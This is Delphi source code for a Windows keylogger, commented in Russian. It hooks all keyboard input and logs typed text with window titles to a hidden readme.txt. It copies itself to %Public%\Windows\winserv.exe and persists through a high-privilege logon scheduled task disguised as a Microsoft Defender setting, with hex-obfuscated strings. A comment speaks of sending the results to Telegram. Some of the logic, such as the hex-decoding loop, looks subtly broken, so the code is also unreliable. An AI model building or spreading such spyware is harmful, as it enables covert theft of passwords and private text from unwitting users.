program keylogger;
{$APPTYPE CONSOLE}
const
  MAX_PATH = 260;
type
  DWORD = LongWord;
  LPCWSTR = PWideChar;
  LPWSTR = PWideChar;
  BOOL = LongBool;
  UINT = LongWord;
  UINT_PTR = System.UIntPtr;
  HWND = type UINT_PTR;
  WPARAM = UINT_PTR;
  INT_PTR = System.IntPtr;
  LPARAM = INT_PTR;
  HKL = type UINT_PTR;
  SHORT = Smallint;
  HHOOK = type UINT_PTR;
  LRESULT = INT_PTR;
  TPoint = record
  X: Longint;
  Y: Longint;
  end;
  TKbDllHookStruct = packed record
  vkCode :WORD;
  scanCode :WORD;
  flags :DWORD;
  time :DWORD;
  dwExtraInfo :pointer;
  end;
  PKbDllHookStruct = ^TKbDllHookStruct;
  PSecurityAttributes = ^TSecurityAttributes;
  _SECURITY_ATTRIBUTES = record
  nLength: DWORD;
  lpSecurityDescriptor: Pointer;
  bInheritHandle: BOOL;
  end;
  TSecurityAttributes = _SECURITY_ATTRIBUTES;
  SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES;
  {$IF not Defined(NEXTGEN)}
  PFileTime = ^TFileTime;
  _FILETIME = record
  dwLowDateTime: DWORD;
  dwHighDateTime: DWORD;
  end;
  TFileTime = _FILETIME;
  FILETIME = _FILETIME;
  {$ENDIF}
  _WIN32_FIND_DATAW = record
  dwFileAttributes: DWORD;
  ftCreationTime: TFileTime;
  ftLastAccessTime: TFileTime;
  ftLastWriteTime: TFileTime;
  nFileSizeHigh: DWORD;
  nFileSizeLow: DWORD;
  dwReserved0: DWORD;
  dwReserved1: DWORD;
  cFileName: array[0..MAX_PATH - 1] of WideChar;
  cAlternateFileName: array[0..13] of WideChar;
  end;
  _WIN32_FIND_DATA = _WIN32_FIND_DATAW;
  TWin32FindDataW = _WIN32_FIND_DATAW;
  TWin32FindData = TWin32FindDataW;
  WIN32_FIND_DATAW = _WIN32_FIND_DATAW;
  WIN32_FIND_DATA = WIN32_FIND_DATAW;
  PMsg = ^TMsg;
  tagMSG = record
  hwnd: HWND;
  message: UINT;
  wParam: WPARAM;
  lParam: LPARAM;
  time: DWORD;
  pt: TPoint;
  end;
  TMsg = tagMSG;
  TKeyboardState = array[0..255] of Byte;
  TFNHookProc = function (code: Integer; wparam: WPARAM; lparam: LPARAM): LRESULT stdcall;
//------------------------------------------------------------------------
const
  shell32  = 'shell32.dll';
  kernel32  = 'kernel32.dll';
  advapi32  = 'advapi32.dll';
  user32   = 'user32.dll';
  WH_KEYBOARD_LL = 13;
  WM_KEYDOWN = $0100;
  WM_SYSKEYDOWN = $0104;
  A0 = $00000002;
  A1 = $80000000;
  faSymLink = $00000400;
  faDirectory = $00000010;
  INVALID_HANDLE_VALUE = THandle(-1);
  ERROR_SHARING_VIOLATION = $20;
  HC_ACTION = 0;
  FILE_ATTRIBUTE_DIRECTORY  = $00000010;
  ERROR_FILE_NOT_FOUND = 2;
  INVALID_FILE_ATTRIBUTES = DWORD($FFFFFFFF);
  GENERIC_READ = DWORD($80000000);
  FILE_SHARE_READ = $00000001;
  OPEN_EXISTING = 3;
  ERROR_PATH_NOT_FOUND = 3;
  ERROR_INVALID_NAME = 123;
  PM_REMOVE = 1;
//------------------------------------------------------------------------
function ShellExecuteW(hWnd: THandle; Operation, FileName, Parameters, Directory: WideString; ShowCmd: Integer): HINST; stdcall;
external shell32 name 'ShellExecuteW';
//========================================================================
function Wow64DisableWow64FsRedirection(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
external kernel32 name 'Wow64DisableWow64FsRedirection';
//========================================================================
function CreateDirectory(lpPathName: LPCWSTR; lpSecurityAttributes: PSecurityAttributes): BOOL; stdcall;
external kernel32 name 'CreateDirectoryW';
//========================================================================
function ExpandEnvironmentStrings(lpSrc: LPCWSTR; lpDst: LPWSTR; nSize: DWORD): DWORD; stdcall;
external kernel32 name 'ExpandEnvironmentStringsW';
//========================================================================
function CharUpperBuff(lpsz: LPWSTR; cchLength: DWORD): DWORD; stdcall;
external user32 name 'CharUpperBuffA';
//========================================================================
procedure Sleep(dwMilliseconds: DWORD); stdcall;
external kernel32 name 'Sleep';
//========================================================================
function CreateFile(lpFileName: LPCWSTR; dwDesiredAccess, dwShareMode: DWORD;
  lpSecurityAttributes: PSecurityAttributes; dwCreationDisposition, dwFlagsAndAttributes: DWORD;
  hTemplateFile: THandle): THandle; stdcall;
external kernel32 name 'CreateFileW';
//========================================================================
function CopyFile(lpExistingFileName, lpNewFileName: LPCWSTR; bFailIfExists: BOOL): BOOL; stdcall;
external kernel32 name 'CopyFileW';
//========================================================================
function FindFirstFile(lpFileName: LPCWSTR; var lpFindFileData: TWIN32FindData): THandle; stdcall;
external kernel32 name 'FindFirstFileW';
//========================================================================
function FindClose(hFindFile: THandle): BOOL; stdcall;
external kernel32 name 'FindClose';
//========================================================================
function GetFileAttributes(lpFileName: LPCWSTR): DWORD; stdcall;
external kernel32 name 'GetFileAttributesW';
//========================================================================
function CloseHandle(hObject: THandle): BOOL; stdcall;
external kernel32 name 'CloseHandle';
//========================================================================
function PeekMessage(var lpMsg: TMsg; hWnd: HWND;
  wMsgFilterMin, wMsgFilterMax, wRemoveMsg: UINT): BOOL; stdcall;
external user32 name 'PeekMessageW';
//========================================================================
function TranslateMessage(const lpMsg: TMsg): BOOL; stdcall;
external user32 name 'TranslateMessage';
//========================================================================
function DispatchMessage(const lpMsg: TMsg): Longint; stdcall;
external user32 name 'DispatchMessageW';
//========================================================================
function ToAsciiEx(uVirtKey: UINT; uScanCode: UINT; const KeyState: TKeyboardState;
  lpChar: PChar; uFlags: UINT; dwhkl: HKL): Integer; stdcall;
external user32 name 'ToAsciiEx';
//========================================================================
function GetKeyboardState(var KeyState: TKeyboardState): BOOL; stdcall;
external user32 name 'GetKeyboardState';
//========================================================================
function GetKeyboardLayout(dwLayout: DWORD): HKL; stdcall;
external user32 name 'GetKeyboardLayout';
//========================================================================
function GetWindowThreadProcessId(hWnd: HWND; lpdwProcessId: Pointer = nil): DWORD; stdcall;
external user32 name 'GetWindowThreadProcessId';
//========================================================================
function GetForegroundWindow: HWND; stdcall;
external user32 name 'GetForegroundWindow';
//========================================================================
function GetAsyncKeyState(vKey: Integer): SHORT; stdcall;
external user32 name 'GetAsyncKeyState';
//========================================================================
function GetWindowText(hWnd: HWND; lpString: LPWSTR; nMaxCount: Integer): Integer; stdcall;
external user32 name 'GetWindowTextW';
//========================================================================
function SetWindowsHookEx(idHook: Integer; lpfn: TFNHookProc; hmod: HINST; dwThreadId: DWORD): HHOOK; stdcall;
external user32 name 'SetWindowsHookExW';
//========================================================================
function UnhookWindowsHookEx(hhk: HHOOK): BOOL; stdcall;
external user32 name 'UnhookWindowsHookEx';
//========================================================================
procedure ExitProcess(uExitCode: UINT); stdcall;
external kernel32 name 'ExitProcess';
//------------------------------------------------------------------------
var
kHook : cardinal;
StringKey: string;
EnterWork: Boolean;
WFER: LongBool;
//------------------------------------------------------------------------
//------------------------------------------------------------------------
function AnsiUpperCase(const S: string): string;
{$IF defined(MSWINDOWS)}
begin
  Result := S;
  if Result <> '' then
  begin
    UniqueString(Result);
    CharUpperBuff(PChar(Result), Length(Result));
  end;
end;
{$ELSEIF defined(USE_LIBICU)}
var
  ResLen: Integer;
  SourceLen: Integer;
  ErrorCode: UErrorCode;
begin
  SourceLen := S.Length;
  if SourceLen > 0 then
  begin
    ErrorCode := U_ZERO_ERROR;
    SetLength(Result, SourceLen);
    ResLen := u_strToUpper(PChar(Result), SourceLen, PChar(S), SourceLen, UTF8CompareLocale, ErrorCode);
    if (ErrorCode > U_ZERO_ERROR) then
    begin
      ErrorCode := U_ZERO_ERROR;
      SetLength(Result, ResLen);
      u_strToUpper(PChar(Result), ResLen, PChar(S), SourceLen, UTF8CompareLocale, ErrorCode);
      if (ErrorCode > U_ZERO_ERROR) then
        raise Exception.CreateFmt(SICUError, [Int32(ErrorCode), UTF8ToString(u_errorName(ErrorCode))]);
    end;
  end
  else Result := S;
end;
{$ELSEIF defined(MACOS)}
var
  MutableStringRef: CFMutableStringRef;
  LOrig: Integer;
  LNew: Integer;
begin
  Result := S;
  if Result <> '' then
  begin
    LOrig := Result.Length;
    LNew := 2 * LOrig;
    SetLength(Result, LNew);
    MutableStringRef := CFStringCreateMutableWithExternalCharactersNoCopy(kCFAllocatorDefault,
      PChar(Result), LOrig, LNew, kCFAllocatorNull);
    if MutableStringRef <> nil then
    try
      CFStringUppercase(MutableStringRef, UTF8CompareLocale);
      LNew := CFStringGetLength(CFStringRef(MutableStringRef));
      SetLength(Result, LNew);
    finally
      CFRelease(MutableStringRef);
    end else
      raise ECFError.Create(SCFStringFailed);
  end;
end;
{$ELSEIF defined(POSIX)}
begin
  Result := UCS4StringToUnicodeString(UCS4UpperCase(UnicodeStringToUCS4String(S)));
end;
{$ENDIF POSIX}
//------------------------------------------------------------------------
function FileExists(const FileName: string; FollowLink: Boolean = True): Boolean;
  function ExistsLockedOrShared(const Filename: string): Boolean;
  var
    FindData: TWin32FindData;
    LHandle: THandle;
  begin
    LHandle := FindFirstFile(PChar(Filename), FindData);
    if LHandle <> INVALID_HANDLE_VALUE then
    begin
      FindClose(LHandle);
      Result := FindData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY = 0;
    end
    else
      Result := False;
  end;
var
  Flags: Cardinal;
  Handle: THandle;
  LastError: Cardinal;
begin
  Flags := GetFileAttributes(PChar(FileName));
  if Flags <> INVALID_FILE_ATTRIBUTES then
  begin
    if faSymLink and Flags <> 0 then
    begin
      if not FollowLink then
        Exit(True)
      else
      begin
        if faDirectory and Flags <> 0 then
          Exit(False)
        else
        begin
          Handle := CreateFile(PChar(FileName), GENERIC_READ, FILE_SHARE_READ, nil,
            OPEN_EXISTING, 0, 0);
          if Handle <> INVALID_HANDLE_VALUE then
          begin
            CloseHandle(Handle);
            Exit(True);
          end;
          LastError := GetLastError;
          Exit(LastError = ERROR_SHARING_VIOLATION);
        end;
      end;
    end;
    Exit(faDirectory and Flags = 0);
  end;
  LastError := GetLastError;
  Result := (LastError <> ERROR_FILE_NOT_FOUND) and
    (LastError <> ERROR_PATH_NOT_FOUND) and
    (LastError <> ERROR_INVALID_NAME) and ExistsLockedOrShared(Filename);
end;
//------------------------------------------------------------------------
function ExtractFilePath(Str:String):String;
var
i, j:Integer;
ostr:String;
b:Boolean;
begin
  b:=False;
  j := Length(Str);
  for i := j downto 1 do
  begin
    if Str[i] = '\' then
      b:=True;
    if b = True then
      ostr := Str[i] + ostr;
  end;
  Result := ostr;
end;
//------------------------------------------------------------------------
procedure ProcessMessage();
var
Msg :TMsg;
begin
 if PeekMessage(msg, 0, 0, 0, PM_REMOVE) then
 begin
    TranslateMessage(msg);
    DispatchMessage(msg);
 end;
end;
//------------------------------------------------------------------------
function StrToInt(const S: string): Integer;
var E: Integer;
begin
Val(S, Result,E);
end;
//------------------------------------------------------------------------
function HexArrToStr(const hexarr:array of string): Ansistring;
var
 i:Integer;
function HexToStr(hex: Ansistring): Ansistring;
var
i: Integer;
begin
for i:= 1 to Length(hex) div 2 do
begin
Result:= Result + AnsiChar(StrToInt('$' +  String(Copy(hex, (i-1) * 2 + 1, 2)) ));
end;
end;
begin
 for i:= 0 to Length(hexarr)-1 do
 begin
 Result :=  HexToStr(AnsiString(hexarr[i]));
 end;
end;
//------------------------------------------------------------------------
procedure WriteStrList(s:string);
const
// readme.txt
hre:Array[0..9] of string=(
'72','65','61','64','6D','65','2E','74','78','74');
var
F:TextFile;
re:string;
begin
   re := string(HexArrToStr(hre));
   AssignFile(F, PChar(ExtractFilePath(ParamStr(0))+re));
   try
     if FileExists(ExtractFilePath(ParamStr(0))+re) = False then
     Rewrite(F) else Append(F);
     Writeln(F,s);
   except
    ProcessMessage;
   end;
   CloseFile(F);
end;
//------------------------------------------------------------------------
procedure AutoRun();
const
// /c schtasks /create /tn "Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Defender Setting" /f /tr "
hs191:Array[0..130] of string=(
'2F','63','20','73','63','68','74','61','73','6B','73','20','2F','63','72','65','61',
'74','65','20','2F','74','6E','20','22','4D','69','63','72','6F','73','6F',
'66','74','5C','57','69','6E','64','6F','77','73','5C','57','69','6E','64',
'6F','77','73','20','53','65','74','74','69','6E','67','20','46','61','63',
'74','6F','72','79','5C','4D','69','63','72','6F','73','6F','66','74','20',
'52','65','63','6F','76','65','72','79','5C','43','6F','6D','6D','6F','6E',
'20','53','79','73','74','65','6D','20','46','69','6C','65','5C','44','65',
'66','65','6E','64','65','72','20','53','65','74','74','69','6E','67','22',
'20','2F','66','20','2F','74','72','20','22');
// " /sc ONLOGON /rl HIGHEST
hs192:Array[0..24] of string=(
'22','20','2F','73','63','20','4F','4E','4C','4F','47','4F','4E','20','2F',
'72','6C','20','48','49','47','48','45','53','54');
// open
HOP:Array[0..3] of string=(
'6F','70','65','6E');
// cmd.exe
HCM:Array[0..6] of string=(
'63','6D','64','2E','65','78','65');
var
SP1,SP2,OP,CM:string;
begin
  SP1 := string(HexArrToStr(hs191));
  SP2 := string(HexArrToStr(hs192));
  OP := string(HexArrToStr(HOP));
  CM := string(HexArrToStr(HCM));
  // автозагрузка в планировщик заданий, исполняем команду в cmd
  if Wow64DisableWow64FsRedirection(WFER) then
    ShellExecuteW(0, OP, CM, PChar(SP1+ParamStr(0)+SP2), '', 0)
  else ShellExecuteW(0, OP, CM, PChar(SP1+ParamStr(0)+SP2), '', 0);
end;
//------------------------------------------------------------------------
function GetWin(Comand: string): string;
var
  buff: array[0..$FF] of char;
begin
  ExpandEnvironmentStrings(PChar(Comand), buff, SizeOf(buff));
  Result := buff;
end;
//------------------------------------------------------------------------
function GetChar(lparam: integer): Ansistring;
var
  data : PKbDllHookStruct;
  keystate: TKeyboardState;
  retcode: Integer;
  l : hkl;
begin
  data := pointer(lparam);
  GetKeyboardState(keystate);
  l :=GetKeyBoardLayout(GetWindowThreadProcessId(GetForegroundWindow));
  SetLength(Result, 2) ;
  retcode := ToAsciiEx(data.vkCode,data.scanCode,keystate, @Result[1],0,l);
  case retcode of
    0: Result := '';
    1: SetLength(Result, 1) ;
  else
    Result := '';
  end;
end;
//------------------------------------------------------------------------
function KeyProcess(code: integer; wparam: integer; lparam: integer): Integer; stdcall;
var
buf: array[Byte] of Char;
begin
  if (code < 0) or (code <> HC_ACTION) then
    result := 0
  else
  begin
    // обработчик обычных клавиш
    if wParam = WM_KEYDOWN then
    begin
      // если не backspace и не enter
      if ((PAnsiChar(lparam) <> #8)
      and (PAnsiChar(lparam) <> #13)) then
      begin
        // если shift зажат
        if getasynckeystate(16) <> 0 then
        begin
         // MessageBox(0,'Нажата клавиша "Shift"','Info',MB_ICONINFORMATION);
          StringKey :=  StringKey + AnsiUpperCase(string(PAnsiChar(GetChar(lparam))));
        end
        else //иначе shift отжат
        begin
           StringKey :=  StringKey + string(PAnsiChar(GetChar(lparam)));
        end;
      end
      else if PAnsiChar(lparam) = #8 then // если нажата backspace
      begin
        // удаление символа
        Delete(StringKey, length(StringKey), 1);
      end
      else if PAnsiChar(lparam) = #13 then // если нажата enter
      begin
        GetWindowText(GetForegroundWindow, buf, Length(buf) * SizeOf(buf[0]));
        if ((StringKey <> '') and (StringKey <> ' ') and (Length(StringKey) >= 1)) then
        begin
            StringKey := '['+string(buf)+']::['+StringKey+']';
            if EnterWork <> True then
            begin
              //пишем в документ
              WriteStrList(StringKey);
              StringKey := '';
            end;
        end;
      end;
    end;
    //обработчик системных клавиш
    if wParam = WM_SYSKEYDOWN then
    begin
    //MessageBox(0,'Нажата клавиша "Alt"','Info',MB_ICONINFORMATION);
    end;
    Result := 0;
  end;
end;
//======================================================================
//----------------------------------------------------------------------
//======================================================================
const
// open
HOPN:Array[0..3] of string=(
'6F','70','65','6E');
//winserv.exe
HFNAME:Array[0..10] of string=(
'77','69','6E','73','65','72','76','2E','65','78','65');
// %Public%\Windows
HPath:Array[0..15] of string=(
'25','50','75','62','6C','69','63','25','5C','57','69','6E','64','6F','77',
'73');
// Хук на клавиатуру установлен!
HOK:Array[0..28] of string=(
'D5','F3','EA','20','ED','E0','20','EA','EB','E0','E2','E8','E0','F2','F3',
'F0','F3','20','F3','F1','F2','E0','ED','EE','E2','EB','E5','ED','21');
var
Path:string;
OPN,FNAME,OK: string;
begin
    FNAME := string(HexArrToStr(HFNAME));
    Path := string(HexArrToStr(HPath));
    Path := GetWin(Path);
    // если файла нет на месте %Public%\Windows\winserv.exe
    if FileExists(PChar(Path+'\'+FNAME)) = False then
    begin
      //создаём директорию %Public%\Windows
      CreateDirectory(PChar(Path), nil);
      //копируем себя в %Public%\Windows\winserv.exe
      CopyFile(PChar(ParamStr(0)), PChar(Path+'\'+FNAME), True);
      //запускаем %Public%\Windows\winserv.exe
      OPN := string(HexArrToStr(HOPN));
      if Wow64DisableWow64FsRedirection(WFER) then
      ShellExecuteW(0, OPN, PChar(Path+'\'+FNAME), '', '', 0)
      else ShellExecuteW(0, OPN, PChar(Path+'\'+FNAME), '', '', 0);
    end;
    //завершаем себя если мы не являемся winserv.exe
    if Pos(FNAME,PChar(ParamStr(0))) = 0 then
    begin
      asm
        call Exitprocess;
      end;
    end;
    //если winserv.exe есть в строке где указан путь до нашего файла то действуем
    if Pos(FNAME,PChar(ParamStr(0))) <> 0 then
    begin
      //нужны права администратора что бы добавить в автозагрузку
      AutoRun();
      //cтавим хук на клавиатуру
      kHook := SetWindowsHookEx(WH_KEYBOARD_LL,@KeyProcess,HInstance,0);
      if kHook <> INVALID_HANDLE_VALUE then
      begin
        //тут пишем куда либо что хук установлен, отправдяем в телегу
        OK := string(HexArrToStr(HOK));
        WriteStrList(OK);
      end;
      //бесконечный цикл
      while True do
      begin
        Sleep(1);
        ProcessMessage();
      end;
      //снимаем хук
      if kHook <> INVALID_HANDLE_VALUE then
      begin
        UnhookWindowsHookEx(kHook);
      end;
    end;
end.
//----------------------------------------------------------------------
//======================================================================

